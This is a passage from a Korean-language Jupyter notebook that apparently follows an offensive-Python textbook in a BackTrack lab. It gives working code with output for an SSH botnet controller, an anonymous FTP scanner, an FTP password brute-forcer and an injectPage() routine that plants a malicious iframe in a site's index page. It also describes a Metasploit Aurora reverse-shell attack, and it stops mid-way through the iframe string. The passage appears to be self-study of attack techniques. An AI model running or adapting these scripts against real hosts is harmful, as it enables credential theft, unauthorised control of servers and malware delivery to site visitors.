      "- \uc774 \ud568\uc218\ub294 \ubaa8\ub4e0 \ubc30\uc5f4\uc5d0 \uc774 \uc791\uc5c5\uc744 \ud558\uace0 \ubd07\ub137 \ubc30\uc5f4\uc5d0 \uc788\ub294 \uac01 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0 \uba85\ub839\uc5b4\ub97c \uc804\uc1a1"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### pxssh \ubaa8\ub4c8\n",
      "\n",
      "- \uad49\uc7a5\ud788 \uc88b\uc740 \ubaa8\ub4c8\uc778\ub4ef\n"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### nameserver Error\n",
      "\n",
      "- default nameserver\n",
      "- nameserver 203.248.252.2\n",
      "- nameserver 164.124.101.2\n",
      "- \uc774\uac83\uc744 nameserver 8.8.8.8 \ub85c \ubc14\uafb8\ub2c8 192.168.10 \ub300\uc5ed\uc744 \uc81c\ub300\ub85c \ucc3e\uc9c0 \ubabb\ud574\uc11c \uc18d\ub3c4\uac00 \ub290\ub824\uc9d0\n",
      "- dhclient\ub294 DHCP\uac00 \uc790\ub3d9\uc73c\ub85c \ud560\ub2f9\ud558\uac8c \ud558\ub294 \uac83. \uadf8\ub7ec\ub2c8 dns \uc11c\ubc84\ub294 \uac74\ub4dc\ub9ac\uc9c0 \ub9d0\uc790. \uc774\uac83 \ub54c\ubb38\uc5d0 2\uc2dc\uac04 \uc0bd\uc9c8\ud568"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "import optparse\n",
      "import pxssh\n",
      "\n",
      "class Client:\n",
      "    def __init__(self, host, user, password):\n",
      "        self.host = host\n",
      "        self.user = user\n",
      "        self.password = password\n",
      "        # \uc0dd\uc131\uc790 \ub9cc\ub4e4\ub54c \uc544\uc608 \uc5f0\uacb0\ud558\uc5ec session\uc744 \uc800\uc7a5\ud558\uc5ec \ub193\ub294\ub2e4.\n",
      "        self.session = self.connect()\n",
      "\n",
      "    def connect(self):\n",
      "        try:\n",
      "            s = pxssh.pxssh()\n",
      "            s.login(self.host, self.user, self.password)\n",
      "            return s\n",
      "        except Exception, e:\n",
      "            print e\n",
      "            print '[-] Error Connecting'\n",
      "\n",
      "    def send_command(self, cmd):\n",
      "        self.session.sendline(cmd)\n",
      "        self.session.prompt()\n",
      "        return self.session.before\n",
      "\n",
      "def botnetCommand(command):\n",
      "    for client in botNet:\n",
      "        output = client.send_command(command)\n",
      "        print '[*] Output from ' + client.host\n",
      "        print '[+] ' + output + '\\n'\n",
      "\n",
      "def addClient(host, user, password):\n",
      "    client = Client(host, user, password)\n",
      "    botNet.append(client)\n",
      "\n",
      "botNet = []\n",
      "# addClient('172.16.190.132', 'root', 'toor')\n",
      "addClient('192.168.10.32', 'violent', 'violent')\n",
      "botnetCommand('uname -v')\n",
      "botnetCommand('cat /etc/issue')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[*] Output from 192.168.10.32\n",
        "[+] uname -v\r\n",
        "#1 SMP Fri Feb 17 10:40:05 EST 2012\r\n",
        "\n",
        "\n",
        "[*] Output from 192.168.10.32"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "[+] cat /etc/issue\r\n",
        "BackTrack 5 R3 - 32 Bit \\n \\l\r\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 118
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uc774 \uc2a4\ud06c\ub9bd\ud2b8\ub294 \ub300\ub7c9\uc758 \uacf5\uaca9\ub300\uc0c1\uc744 \uc81c\uc5b4\ud560 \ub54c \uc720\uc6a9\ud558\uac8c \uc0ac\uc6a9\n",
      "- \ud14c\uc2a4\ud2b8\ud558\uae30 \uc704\ud574\uc11c 3\uac1c\uc758 \ubc31\ud2b8\ub799 \uac00\uc0c1\uba38\uc2e0 \uc124\uce58\n",
      "- 3\uac1c\uc758 \ud638\uc2a4\ud2b8\uc5d0 \ub3d9\uc2dc\uc5d0 \uba85\ub839\uc744 \ub0b4\ub9ac\ub294 \uac83\uc744 \ubcfc \uc218 \uc788\uc74c\n",
      "- \uc5ec\uae30\uc11c\ub294 SSH \ubd07\ub137 \uc0dd\uc131 \uc2a4\ud06c\ub9bd\ud2b8\uac00 \uc11c\ubc84\ub97c \uc9c1\uc811 \uacf5\uaca9\ud588\uc9c0\ub9cc, \ub2e4\uc74c \uc808\uc5d0\uc11c\ub294 \ucde8\uc57d\ud55c \uc11c\ubc84\ub97c \ud074\ub77c\uc774\uc5b8\ud2b8\ub85c \uac04\uc811\uc801\uc73c\ub85c \uacf5\uaca9\ud558\ub294 \ubca1\ud130\uc640 \ub300\uaddc\ubaa8\ub85c \uac10\uc5fc\uc2dc\ud0a4\ub294 \ub2e4\ub978 \ubc29\ubc95\uc5d0 \ucd08\uc810"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### FTP\uc640 \uc6f9\uc744 \uc774\uc6a9\ud55c \ub300\uaddc\ubaa8 \uacf5\uaca9\n",
      "\n",
      "- \uacfc\uac70 k985ytv\ub77c\uace0 \ubd88\uae30\ub294 \ub300\uaddc\ubaa8 \ud574\ud0b9 \uacf5\uaca9\n",
      "- \uc775\uba85 FTP\uc640 \ud0c8\ucde8\ud55c FTP \uc778\uc99d \uc815\ubcf4\ub97c \uac00\uc9c0\uace0 22,400\uac1c\uc758 \ub3c4\uba54\uc778\uc5d0 \uc788\ub294 \uc57d 536,000\uac1c\uc758 \ud398\uc774\uc9c0\uc5d0 \ub300\ud55c \uc811\uadfc \uad8c\ud55c\uc744 \ud68d\ub4dd\n",
      "- \uacf5\uaca9\uc790\ub294 \uc774\ub7ec\ud55c \ud398\uc774\uc9c0\uc5d0 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\ub97c \uc0bd\uc785\ud558\uc5ec \uc6b0\ud06c\ub77c\uc774\ub098\uc5d0 \uc788\ub294 \uc545\uc131 \ub3c4\uba54\uc778\uc73c\ub85c \ubc29\ubb38\uc790\uac00 \ub9ac\ub2e4\uc774\ub809\ud2b8\ud558\ub3c4\ub85d \ud588\ub2e4.\n",
      "- \uac10\uc5fc\ub41c \uc11c\ubc84\uac00 \ud53c\ud574\uc790\ub97c \ub9ac\ub2e4\uc774\ub809\ud2b8\ud558\uba74 \uc545\uc758\uc801\uc778 \uc6b0\ud06c\ub77c\uc774\ub098 \ud638\uc2a4\ud2b8\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\uc758 \uc2e0\uc6a9\uce74\ub4dc \uc815\ubcf4\ub97c \ud0c8\ucde8\ud558\ub294 \uac00\uc9dc \ubc31\uc2e0 \ud504\ub85c\uadf8\ub7a8\uc744 \ud53c\ud574\uc790 \ucef4\ud4e8\ud130\uc5d0 \uc124\uce58\ub418\ub3c4\ub85d \ub9cc\ub4ec\n",
      "\n",
      "\n",
      "- \uac10\uc5fc\ub41c \uc11c\ubc84\uc758 FTP \ub85c\uadf8\ub97c \uc0b4\ud3b4\ubcf4\uba74 \uc2e4\uc81c\ub85c \uc5b4\ub5a4 \uc77c\uc774 \ubc1c\uc0dd\ud588\ub294\uc9c0 \uc815\ud655\ud788 \uc54c \uc218 \uc788\uc74c\n",
      "\n",
      "\n",
      "1. \uc790\ub3d9\ud654\ub41c \uc2a4\ud06c\ub9bd\ud2b8\ub294 \uacf5\uaca9\ub300\uc0c1\uc5d0 index.htm \uc774\ub77c\ub294 \uae30\ubcf8\uc124\uc815 \ud398\uc774\uc9c0\uac00 \uc788\ub294\uc9c0 \ud655\uc778\ud558\uae30 \uc704\ud574 \uc11c\ubc84\uc5d0 \uc5f0\uacb0\n",
      "2. \uacf5\uaca9\uc790\ub294 \uc0c8\ub85c\uc6b4 index.htm\uc744 \uc11c\ubc84\uc5d0 \uc5c5\ub85c\ub4dc\ud588\ub2e4. \uc544\ub9c8 \uc774 \ud30c\uc77c\uc5d0 \uc545\uc758\uc801\uc778 \ub9ac\ub2e4\uc774\ub809\ud2b8 \uc2a4\ud06c\ub9bd\ud2b8\uac00 \uc0bd\uc785\ub418\uc5b4 \uc788\uc5c8\uc744 \uac83\n",
      "3. \uadf8\ub9ac\uace0 \uac10\uc5fc\ub41c \uc11c\ubc84\ub294 \uc774 \ud398\uc774\uc9c0\ub97c \ubc29\ubb38\ud558\ub294 \ubaa8\ub4e0 \ucde8\uc57d\ud55c \ucef4\ud4e8\ud130\ub97c \uacf5\uaca9\ud588\ub2e4."
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### FTP\n",
      "\n",
      "- [List of raw FTP commands](http://www.nsftools.com/tips/RawFTP.htm#TYPE)\n",
      "- [List of FTP server return codes](http://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)\n",
      "- [BackTrack 5 R3 - FTP \uc0ac\uc6a9\ud558\uae30](http://blog.naver.com/PostView.nhn?blogId=67sooon&logNo=10161407793)\n",
      "- [FTP \uba85\ub839\uc5b4](http://linuxholic.tistory.com/65)"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "    204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] \"LIST / folderthis/folderthat/\" 226 1862\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"TYPE I\" 200 -\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"PASV\" 227 -\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"SIZE index.html\" 213 -\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"RETR index.htm\" 213 -\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"TYPE I\" 200 -\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"PASV\" 227 -\n",
      "    204.12.252.138 UNKNOWN u47973886 [14/AUG/2011:23:19:27 -0500] \"STOR index.htm\" 226 3018"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \uc774 \uacf5\uaca9\uc758 \ucd5c\ucd08 \ubca1\ud130\uc5d0 \ub300\ud574 \uc880 \ub354 \uc774\ud574\ud558\uae30 \uc704\ud574 FTP\uc758 \ud2b9\uc131\n",
      "- \ud30c\uc77c \uc804\uc1a1 \ud504\ub85c\ud1a0\ucf5c(File Transfer Protocol, FTP) \uc11c\ube44\uc2a4\ub294 TCP \uae30\ubc18\uc758 \ub124\ud2b8\uc6cc\ud06c\uc5d0\uc11c \uc0ac\uc6a9\uc790\ub4e4\uc774 \uc11c\ub85c \ud30c\uc77c\uc744 \uc804\uc1a1\ud560 \uc218 \uc788\ub3c4\ub85d \ud574\uc90c\n",
      "- \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\uc790\ub294 \uc0ac\uc6a9\uc790\uc774\ub984\uacfc \ud328\uc2a4\uc6cc\ub4dc \uc870\ud569\uc73c\ub85c FTP \uc11c\ubc84\uc5d0 \uc778\uc99d\n",
      "- \ud558\uc9c0\ub9cc \uc77c\ubd80 \uc0ac\uc774\ud2b8\uc5d0\uc11c\ub294 \uc775\uba85\uc73c\ub85c \uc778\uc99d\ud560 \uc218 \uc788\ub294 \uae30\ub2a5 \uc81c\uacf5. \uc774 \uacbd\uc6b0 \uc0ac\uc6a9\uc790\ub294 \uc0ac\uc6a9\uc790\uc774\ub984\uc5d0 \"anonymous\" \ub77c\uace0 \uc785\ub825\ud558\uace0 \ud328\uc2a4\uc6cc\ub4dc \ub313\ub2c8\uc5d0 \uc774\uba54\uc77c \uc8fc\uc18c\ub97c \uc785\ub825\ud558\uba74 \ub428"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \ud30c\uc774\uc36c\uc73c\ub85c \uc775\uba85 FTP \uc2a4\uce90\ub108 \ub9cc\ub4e4\uae30\n",
      "\n",
      "- \ubcf4\uc548\uc801 \uad00\uc810\uc5d0\uc11c \uc0dd\uac01\ud574\ubcf4\uba74 \ub204\uac00 \uacfc\uc5f0 \uc775\uba85 FTP \uc811\uadfc \uad8c\ud55c\uc744 \ud5c8\uc6a9\ud560\uae4c?\n",
      "- \ud558\uc9c0\ub9cc \ub180\ub78d\uac8c\ub3c4 \ub9ce\uc740 \uc0ac\uc774\ud2b8\uac00 \uc815\ub2f9\ud55c \uc774\uc720\ub85c \uc775\uba85 FTP \uc811\uadfc\uc744 \ud5c8\uc6a9\n",
      "- \uc608\ub85c, **\uc18c\ud504\ud2b8\uc6e8\uc5b4 \uc5c5\ub370\uc774\ud2b8\ub97c \uc880 \ub354 \uc6d0\ud65c\ud558\uac8c**\n",
      "- ftplib \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \ud65c\uc6a9\ud558\uc5ec \ud2b9\uc815 \uc11c\ubc84\uac00 \uc775\uba85 \ub85c\uadf8\uc778\uc744 \ud5c8\uc6a9\ud558\ub294\uc9c0 \ud310\ub2e8\ud558\ub294 \uc2a4\ud06c\ub9bd\ud2b8\ub97c \uc791\uc131\ud560 \uac83\n",
      "- anonLogin() \ud568\uc218\ub294 \ud638\uc2a4\ud2b8 \uc774\ub984\uc744 \uc785\ub825\ubc1b\uace0 \uc775\uba85 \ub85c\uadf8\uc778\uc774 \ud5c8\uc6a9\ub418\ub294\uc9c0 \ubb18\uc0ac\ud558\ub294 \ubd88\ub9ac\uc5b8\uc744 \ubc18\ud658\n",
      "- \ud568\uc218\ub294 \uc775\uba85\uc758 \uacc4\uc815\uc73c\ub85c FTP \uc5f0\uacb0\uc744 \uc2dc\ub3c4\n",
      "- \ub9cc\uc57d \uc131\uacf5\ud558\uba74 \"True\"\ub97c \ubc18\ud658, \ub9cc\uc57d \uc5f0\uacb0\uc744 \uc2dc\ub3c4\ud558\ub294 \uacfc\uc815\uc5d0\uc11c \uc608\uc678\uac00 \ubc1c\uc0dd\ud558\uba74 \"False\"\ub97c \ubc18\ud658"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import ftplib"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import ftplib\n",
      "def anonLogin(hostname):\n",
      "    try:\n",
      "        ftp = ftplib.FTP(hostname)\n",
      "        ftp.login('anonymous', 'me@your.com')\n",
      "        print '\\n[*] ' + str(hostname) +\\\n",
      "        ' FTP Anonymous Logon Succeeded.'\n",
      "        print ftp.dir()\n",
      "        ftp.quit()        \n",
      "        return True\n",
      "    except Exception, e:\n",
      "        print '\\n[-] ' + str(hostname) +\\\n",
      "        ' FTP Anonymous Logon Failed.'\n",
      "        return False\n",
      "\n",
      "host = '192.168.32.159'\n",
      "anonLogin(host)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "[*] 192.168.32.159 FTP Anonymous Logon Succeeded.\n",
        "-rwxrwxrwx   1 ALFtp    ALFtp          12 Jun 06 17:50 hello.txt\n",
        "-rwxrwxrwx   1 ALFtp    ALFtp          12 Jun 06 17:50 hi.txt\n",
        "None\n"
       ]
      },
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 11,
       "text": [
        "True"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Brute Login"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%writefile ch02/userpass.txt\n",
      "root:nice\n",
      "root:apple\n",
      "root:toor\n",
      "root:oracle"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Writing ch02/userpass.txt\n"
       ]
      }
     ],
     "prompt_number": 12
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import ftplib\n",
      "def bruteLogin(hostname, passwdFile):\n",
      "    with open(passwdFile, 'r') as pF:\n",
      "        for line in pF:\n",
      "            userName = line.split(':')[0]\n",
      "            passWord = line.split(':')[1].strip('\\r').strip('\\n')\n",
      "            print '[+] Trying: ' + userName + '/' + passWord\n",
      "            try:\n",
      "                ftp = ftplib.FTP(hostname)\n",
      "                ftp.login(userName, passWord)\n",
      "                print '\\n[*] ' + str(hostname) +\\\n",
      "                ' FTP Logon Succeeded: ' + userName + '/' + passWord\n",
      "                ftp.quit()\n",
      "                return(userName, passWord)\n",
      "            except Exception, e:\n",
      "                pass\n",
      "        print '\\n[-] Could not brute force FTP credentials.'\n",
      "        return(None, None)\n",
      "\n",
      "host = '192.168.10.94'\n",
      "passWdFile = 'ch02/userpass.txt'\n",
      "bruteLogin(host, passWdFile)\n",
      "        "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[+] Trying: root/nice\n",
        "[+] Trying: root/apple\n",
        "[+] Trying: root/toor\n",
        "\n",
        "[*] 192.168.10.94 FTP Logon Succeeded: root/toor\n"
       ]
      },
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 14,
       "text": [
        "('root', 'toor')"
       ]
      }
     ],
     "prompt_number": 14
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### FTP \uc11c\ubc84\uc5d0 \uc788\ub294 \uc6f9 \ud398\uc774\uc9c0 \uac80\uc0c9\ud558\uae30\n",
      "\n",
      "- FTP \uc11c\ubc84\uc5d0 \uc788\ub294 \uc778\uc99d\uc815\ubcf4\ub85c \uc11c\ubc84\uc5d0\uc11c \uc6f9 \uc811\uc18d\uc744 \uc81c\uacf5\ud558\ub294\uc9c0 \ud655\uc778\ud574\uc57c \ud568\n",
      "\n",
      "\n",
      "1. FTP \uc11c\ubc84\uc758 \ub514\ub809\ud1a0\ub9ac\uc5d0 \uc788\ub294 \ucf58\ud150\uce20\uc758 \ubaa9\ub85d\uc744 \uac00\uc838\uc624\uace0\n",
      "2. \ub2e4\ub978 \ub514\ud3f4\ud2b8 \uc6f9 \ud398\uc774\uc9c0\ub97c \uac80\uc0c9\n",
      "\n",
      "\n",
      "- returnDefault() \ud568\uc218\ub294 FTP \uc5f0\uacb0\uc744 \uc785\ub825 \ubc1b\uc544\uc11c \ubc1c\uacac\ud55c \ub514\ud3f4\ud2b8 \ud398\uc774\uc9c0\ub97c \ubc30\uc5f4\ub85c \ubc18\ud658\n",
      "- \ub514\ub809\ud1a0\ub9ac \ucee8\ud150\uce20\ub97c \uc5f4\uac70\ud558\ub294 NLST \uba85\ub839\uc5b4 \uc0ac\uc6a9\n",
      "- \ud568\uc218\ub294 NLST\uc5d0\uc11c \ubc18\ud658\ud558\ub294 \uac01 \ud30c\uc77c \uc774\ub984\uc744 \ub514\ud3f4\ud2b8 \uc6f9 \ud398\uc774\uc9c0 \ud30c\uc77c \uc774\ub984\uacfc \uc77c\uce58\ud558\ub294\uc9c0 \ud655\uc778\n",
      "- \ubc1c\uacac\ub41c \ub514\ud3f4\ud2b8 \ud398\uc774\uc9c0\ub97c retList\ub77c\ub294 \ubc30\uc5f4\uc5d0 \ucd94\uac00\ud558\uace0 \ud568\uc218\ub294 \uc791\uc5c5\uc774 \ub05d\ub098\uba74 \uc774 \ubc30\uc5f4\uc744 \ubc18\ud658"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Apache in BackTrack 5 R3\n",
      "\n",
      "- [apache start - Backtrack - Services - HTTPD - apache start](http://www.question-defense.com/2012/12/11/apache-start-backtrack-services-httpd-apache-start)\n",
      "- [How to install and Use Apache Server on BackTrack Linux](http://www.ubuntumanual.org/posts/407/how-to-install-and-use-apache-server-on-backtrack-linux)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# -*- coding: utf-8\n",
      "\n",
      "import ftplib\n",
      "\n",
      "def returnDefault(ftp):\n",
      "    try:\n",
      "        # returNs LiST of filenames\n",
      "        dirList = ftp.nlst()\n",
      "    except:\n",
      "        dirList = []\n",
      "        print '[-] Could not list directory contents.'\n",
      "        print '[-] Skipping To Next Target.'\n",
      "        return\n",
      "    retList = []\n",
      "    for fileName in dirList:\n",
      "        fn = fileName.lower()\n",
      "        if '.php' in fn or \\\n",
      "        '.htm' in fn or \\\n",
      "        '.asp' in fn:\n",
      "            print '[+] Found default page: ' + fileName\n",
      "            retList.append(fileName)\n",
      "    return retList\n",
      "\n",
      "host = '192.168.10.94'\n",
      "userName = 'root'\n",
      "passWord = 'toor'\n",
      "\n",
      "ftp = ftplib.FTP(host)\n",
      "ftp.login(userName, passWord)\n",
      "returnDefault(ftp)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[+] Found default page: index.asp\n",
        "[+] Found default page: index.htm\n"
       ]
      },
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 26,
       "text": [
        "['index.asp', 'index.htm']"
       ]
      }
     ],
     "prompt_number": 26
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### \uc6f9 \ud398\uc774\uc9c0\uc5d0 \uc545\uc131\ucf54\ub4dc \uc0bd\uc785\ud558\uae30\n",
      "\n",
      "#### MS10_002_aurora Exploit\n",
      "\n",
      "- [MS10_002_aurora Exploit](http://www.youtube.com/watch?v=Y6Hc4x4vUds)\n",
      "- [MS10_002 Microsoft Internet Explorer \"Aurora\" Memory Corruption](http://www.rapid7.com/db/modules/exploit/windows/browser/ms10_002_aurora): only IE6\n",
      "- [Metasploit Meterpreter: Internet Explorer \"Aurora\" Memory Corruption Client-Side Exploit](http://www.pax-pentest.net/penetration-testing/metasploit-meterpreter-internet-explorer-aurora-memory-corruption-client-side-exploit/)\n",
      "- [\uc624\ud37c\ub808\uc774\uc158 \uc624\ub85c\ub77c - 2010/1](http://blog.naver.com/PostView.nhn?blogId=thomaskim9&logNo=200147502&parentCategoryNo=&categoryNo=88&viewDate=&isShowPopularPosts=false&from=postView)\n",
      "- [Operation Aurora - wiki](http://en.wikipedia.org/wiki/Operation_Aurora)\n",
      "\n",
      "\n",
      "1. \uc0ac\uc6a9\uc790\uac00 \uc2e0\ub8b0\ud558\uace0 \uc788\ub294 \uacf3\uc73c\ub85c\ubd80\ud130 \ub9c1\ud06c\uac00 \ud3ec\ud568\ub41c \uc774\uba54\uc77c \ub610\ub294 \uc778\uc2a4\ud134\ud2b8 \uba54\uc2dc\uc9c0\ub97c \uc218\uc2e0\ud55c\ub2e4.\n",
      "2. \uc0ac\uc6a9\uc790\ub294 \uc545\uc131 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\uac00 \ud3ec\ud568\ub418\uc5b4 \uc788\ub294 \ub9c1\ud06c(\ud0c0\uc774\uc644 \ud638\uc2a4\ud305 \uc11c\ube44\uc2a4)\ub97c \ud074\ub9ad\ud55c\ub2e4.\n",
      "3. InternetExplorer \uc81c\ub85c\ub370\uc774(Zero-day) \uacf5\uaca9\uc774 \ud3ec\ud568\ub41c \uc545\uc131 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\uac00 \uc0ac\uc6a9\uc790\uc758 \ube0c\ub77c\uc6b0\uc800\ub97c \ud1b5\ud574 \ub2e4\uc6b4\ub85c\ub4dc \ub418\uace0 \uc2e4\ud589\ub41c\ub2e4.\n",
      "4. \uc774\ubbf8\uc9c0\ucc98\ub7fc \uc704\uc7a5\ud55c \uc545\uc131\ucf54\ub4dc\ub294 \ud0c0\uc774\uc644 \uc11c\ubc84\ub85c\ubd80\ud130 \ub2e4\uc6b4\ub428\uacfc \ub3d9\uc2dc\uc5d0 \uc2e4\ud589\ub41c\ub2e4.\n",
      "5. \uc545\uc131\ucf54\ub4dc\ub294 \ubc31\ub3c4\uc5b4\ub97c \uc0dd\uc131\ud55c \ud6c4, \ud0c0\uc774\uc644\uc5d0 \uc788\ub294 C&C \uc11c\ubc84\uc5d0 \uc811\uc18d\ud55c\ub2e4.\n",
      "6. \uadf8 \uacb0\uacfc, \uacf5\uaca9\uc790\ub294 Software Configuration Management \uac19\uc740 \ub0b4\ubd80 \uc2dc\uc2a4\ud15c\uc5d0 \uc811\uc18d\ud55c \ud6c4, \ucd5c\uc885\ubaa9\ud45c\uc778 \uc18c\uc2a4\ucf54\ub4dc\ub97c \uc678\ubd80\ub85c \uc720\ucd9c\ud55c\ub2e4."
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### Using metasploit exploit\n",
      "\n",
      "<img src=\"files/images/exploit1.png\" />"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- \ucde8\uc57d\ud55c \ucef4\ud4e8\ud130(IE 6)\ub85c http://172.16.190.132:80 \uc5d0 \uc811\uc18d\ud558\ub294 \ubaa8\ub4e0 \ubc29\ubb38\uc790\uc758 \ucef4\ud4e8\ud130\uac00 \ud574\ud0b9\ub420 \uac83\n",
      "- \ub9cc\uc57d \uc131\uacf5\ud558\uba74, \uc545\uc131\ucf54\ub4dc\ub294 \ub9ac\ubc84\uc2a4 TCP \uc258\uc744 \uc0dd\uc131\ud558\uc5ec \ud53c\ud574\uc790 \ucef4\ud4e8\ud130\uc758 \uc708\ub3c4\uc6b0 \ucee4\ub9e8\ub4dc \ud504\ub86c\ud504\ud2b8\uc5d0 \uc811\uadfc\ud560 \uc218 \uc788\ub3c4\ub85d \ud558\uac8c \ub41c\ub2e4.\n",
      "- \ucee4\ub9e8\ub4dc \uc258\uc5d0\uc11c\ub294 \uac10\uc5f0\ub41c \ud53c\ud574\uc790\uc758 \uad00\ub9ac\uc790 \uad8c\ud55c\uc73c\ub85c \uba85\ub839\uc744 \uc2e4\ud589\uc2dc\ud0ac \uc218 \uc788\uac8c \ub428\n",
      "- \uac10\uc5fc\ub41c \uc11c\ubc84\uc5d0 \ub9ac\ub2e4\uc774\ub809\ud2b8\ub97c \ucd94\uac00\ud558\uc5ec \uc6b0\ub9ac\uac00 \uc124\uce58\ud55c \uc545\uc758\uc801\uc778 \uc11c\ubc84\ub85c \ubc29\ubb38\uc790\uac00 \ub9ac\ub2e4\uc774\ub809\ud2b8 \ub418\ub3c4\ub85d \ud574\uc57c \ud568\n",
      "\n",
      "\n",
      "#### \uc545\uc758\uc801\uc778 \uc11c\ubc84\ub85c \ub9ac\ub2e4\uc774\ub809\ud2b8 \ud558\ub294 \uacfc\uc815\n",
      "\n",
      "1. \ud53c\ud574\uc790 \uc11c\ubc84\uc5d0 \uc788\ub294 \ub514\ud3f4\ud2b8 \ud398\uc774\uc9c0\ub97c \ub2e4\uc6b4\ub85c\ub4dc\n",
      "2. iframe\uc744 \uc0bd\uc785\n",
      "3. \ub2e4\uc2dc \uc545\uc758\uc801\uc778 \ud398\uc774\uc9c0\ub97c \ud53c\ud574\uc790 \uc11c\ubc84\uc5d0 \uc5c5\ub85c\ub4dc\n",
      "\n",
      "#### injectPage() \ud568\uc218\n",
      "\n",
      "- FTP \uc5f0\uacb0\n",
      "- \ud398\uc774\uc9c0 \uc774\ub984\n",
      "- \ub9ac\ub2e4\uc774\ub809\ud2b8 iframe\uc744 \uc785\ub825\ubc1b\uc74c"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "#### vsftpd problems in BackTrack\n",
      "\n",
      "- [550 Permission denied.](http://www.ubuntu-kr.org/viewtopic.php?p=46364): write_enable=YES \uac00 \uc8fc\uc11d\ucc98\ub9ac \ub418\uc5b4 \uc788\uc73c\ub2c8 \uc5c6\uc560\uc8fc\uba74 \ub428. \uadf8\ub9ac\uace0 \uc124\uc815 \ud30c\uc77c\uc774 \ubcc0\uacbd \ub410\uc73c\uba74 \uaf2d **\uc7ac\uc2dc\uc791**. \uc774\uac83 \ub54c\ubb38\uc5d0 30\ubd84 \uc0bd\uc9c8\n",
      "- [vsftpd \ud648 \ub514\ub809\ud1a0\ub9ac \ubc97\uc5b4\ub0a0 \uc218 \uc788\uac8c \ud558\uae30](http://jmnote.com/wiki/Vsftpd_\ud648_\ub514\ub809\ud1a0\ub9ac_\ubc97\uc5b4\ub0a0_\uc218_\uc788\uac8c_\ud558\uae30)\n",
      "\n",
      "> useradd -m violent\n",
      "\n",
      ">passwd violent\n",
      "\n",
      "- /home/violent \ub8e8\ud2b8\uac00 \uae30\ubcf8 \ub514\ub809\ud1a0\ub9ac\ub2e4. \uc5ec\uae30\uc5d0 index.html\uc744 \uc62c\ub824\uc57c \ub41c\ub2e4. secure_chroot_dir\uc5d0 \uc18d\uc9c0 \ub9d0\uac83!\n"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import ftplib\n",
      "\n",
      "def injectPage(ftp, page, redirect):\n",
      "    f = open(page + '.tmp', 'w')\n",
      "    ftp.retrlines('RETR ' + page, f.write)\n",
      "    print '[+] Downloaded Page: ' + page\n",
      "    f.write(redirect)\n",
      "    f.close()\n",
      "    print '[+] Injected Malicious IFrame on: ' + page\n",
      "    ftp.storlines('STOR ' + page, open(page + '.tmp'))\n",
      "    print '[+] Uploaded Injected Page: ' + page\n",
      "    \n",
      "# host = '172.16.190.132'\n",
      "host = '192.168.10.94'\n",
      "port = 80\n",
      "userName = 'root'\n",
      "passWord = 'toor'\n",
      "ftp = ftplib.FTP(host)\n",
      "ftp.login(userName, passWord)\n",
      "redirect = '<iframe src=' +\\\n",
      "            '\"http://' +\\\n",
      "            host +\\\n",
